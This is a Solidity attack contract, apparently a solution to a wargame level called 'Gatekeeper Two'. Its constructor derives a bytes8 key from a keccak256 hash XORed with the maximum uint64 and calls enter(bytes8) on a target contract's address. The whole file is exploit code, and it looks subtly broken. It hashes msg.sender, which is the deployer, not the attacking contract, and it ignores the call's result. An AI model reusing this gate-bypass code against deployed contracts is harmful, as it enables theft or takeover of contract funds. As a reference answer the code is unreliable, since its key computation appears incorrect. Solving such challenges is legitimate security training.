// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract GatekeeperTwoAttack {

    constructor(address _gatekeeperTwoContractAddress) {
        bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))) ^ bytes8((type(uint64).max));
        _gatekeeperTwoContractAddress.call(abi.encodeWithSignature("enter(bytes8)", key));
    }
}